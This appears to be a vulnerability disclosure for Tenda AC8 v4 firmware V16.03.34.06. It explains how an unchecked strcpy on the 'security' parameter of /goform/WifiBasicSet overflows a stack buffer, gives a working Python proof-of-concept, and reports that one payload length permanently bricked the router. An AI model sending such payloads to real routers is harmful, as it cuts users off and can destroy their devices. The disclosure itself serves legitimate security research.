# Tenda AC8 v4 V16.03.34.06
Under **/goform/WifiBasicSet**, the parameters **security** and **security_5g** can lead to stack overflow vulnerabilities【The following takes the stack overflow caused by the **security** parameter as an example】
## Environment & Tool Versions Used:  
- Ubuntu 22.04  
- binwalk v2.2.1  
- IDA Pro 9.0  


## Environment Preparation  
Download the corresponding router firmware from the official website: https://tenda.com.cn/material/show/3518  
- Firmware: AC8 v4 Upgrade Software_V16.03.34.06  
- Software Version: V16.03.34.06  
- Update Date: November 29, 2024  
- File Size: 6.86 MB  
- File Format: zip  


After unzipping the downloaded zip file, use the binwalk tool to parse the firmware:  
```bash
binwalk -eM [firmware file]  # The latest binwalk version has poor parsing effect, so v2.2.1 is used here.
```  

After normal parsing, navigate to the `squashfs-root` directory. The router startup program path is `./bin/httpd`. Use the `file` command to check the program:  
```bash
file ./bin/httpd  
# Output: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mipsel.so.1, stripped
```  


## Vulnerability Proof  
In the `/goform/WifiBasicSet` endpoint, the `security` and `security_5g` parameters cause a stack overflow vulnerability. The `formWifiBasicSet` function calls `sub_45F3E8`, which proceeds through the following functions:  
`sub_45F3E8 -> sub_45E1C4 -> sub_45DC58`  

In `sub_45DC58`, the `strcpy` function at line 30 causes a stack overflow vulnerability.  

```c
int _fastcall sub_45DC58(int a1, int a2, const char *a3) {
    size_t v3; // $ve
    int mibname; // $ve
    int v6; // $ve
    char *src; // [sp+18h] [+18h]
    char v8[256]; // [sp+24h] [+24h] BYREF
    _BYTE v9[256]; // [sp+124h] [+124h] BYREF
    _BYTE v10[256]; // [sp+224h] [+224h] BYREF
    int v11; // [sp+324h] [+324h]

    memset(v8, 0, sizeof(v8));
    v11 = 256;
    memset(v9, 0, sizeof(v9));
    memset(v10, 0, sizeof(v10));
    v3 = strlen(a3);
    if (!strncmp(a3, "0", v3))
        src = websGetVar(a1, "security", (int)"none");
    else
        src = websGetVar(a1, "security_5g", (int)"none");
    if (!src)
        return 1;
    mibname = wifi_get_mibname(a2, "bss_security", v9);
    GetValue(mibname, v10);
    SetValue(v9, src);
    if (!strcmp(src, "wpapsk") || !strcmp(src, "wpa2psk") || strcmp(src, "wpawpa2psk"))
        SetValue(v9, "wpapsk");
    else
        SetValue(v9, src);
    strcpy(v8, src);
    v6 = wifi_get_mibname(a2, "bss_wpapsk_type", v9);
    GetValue(v6, v10);
    if (!strcmp(src, "wpapsk")) {
        SetValue(v9, "psk");
    } else if (!strcmp(src, "wpa2psk")) {
        SetValue(v9, "psk2");
    } else if (!strcmp(src, "wpawpa2psk")) {
        SetValue(v9, "psk+psk2");
    }
    return sub_45D91C(a1, a2, v8, a3);
}
```  

Without setting other parameters, the program will accept the `security` parameter in `sub_45DC58`. An attacker can input sufficiently long data into this parameter, causing a buffer overflow when the program executes the `strcpy` function.  


### POC (Proof of Concept)  
```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0',
    "Cookie": "password=381acc5cfbc629c40245413ef90a4439mffcvb"  # If the router has a password, capture the cookie first.
}

url = "http://tendawifi.com"
url_vuln = url + "/goform/WifiBasicSet"

# payload = 'a'*0x100  # No stack overflow, router runs normally.
# payload = 'a'*(0x100+8)  # Not recommended; may brick the router.
payload = 'a'*0x1000  # Management interface returns to login page.

data = {
    'security': payload
}

response = requests.post(url_vuln, data=data, headers=headers)
print(response.text)
```  


#### Test Results  
1. When `payload = 'a'*0x100`:  
```bash
{"errCode":0}
```  

2. When `payload = 'a'*0x1000`:  
```bash
Traceback (most recent call last):
...
requests.exceptions.ConnectionError: HTTPConnectionPool(host='tendawifi.com', port=80): Max retries exceeded with url: /goform/WifiBasicSet (Caused by NewConnectionError(...))
```  
(The router's management interface returns to the login page, but other devices remain connected.)  

3. When `payload = 'a'*(0x100+8)`:  
The router crashes, disconnects all devices, and cannot be reconnected even after a reboot (requires customer service support for repair).  


**Note**: The vulnerability was confirmed through code auditing and real-world testing, although executing the POC in a QEMU virtual environment encountered runtime issues due to file permission configurations.
